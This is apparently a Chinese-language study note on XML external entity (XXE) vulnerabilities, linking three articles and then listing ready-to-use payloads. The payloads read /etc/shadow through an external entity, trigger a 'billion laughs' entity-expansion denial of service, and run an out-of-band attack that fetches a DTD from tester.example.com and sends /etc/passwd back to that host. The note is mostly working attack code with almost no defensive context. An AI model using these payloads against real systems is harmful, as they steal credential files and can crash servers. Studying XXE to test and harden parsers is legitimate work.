# XXE漏洞的学习：

1. [XXE漏洞的学习与利用总结](https://www.cnblogs.com/r00tuser/p/7255939.html)
2. [XXE漏洞利用技巧：从XML到远程代码执行](https://www.freebuf.com/articles/web/177979.html)
3. [XXE: XML eXternal Entity Injection vulnerabilities](https://www.gracefulsecurity.com/xml-external-entity-injection-xxe-vulnerabilities/)

基础Payload：

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&ent;</lastName>
</userInfo>
```

```
<!--?xml version="1.0" ?-->
<!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
<tag>&lol9;</tag>
```

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ 
<!ENTITY % pe SYSTEM "http://tester.example.com/xxe_file">
%pe;
%param1;
]>
<foo>&external;</foo>




The contents of xxe_file should be:
<!ENTITY % payload SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY external SYSTEM 'http://tester.example.com/log_xxe?data=%payload;'>">
```
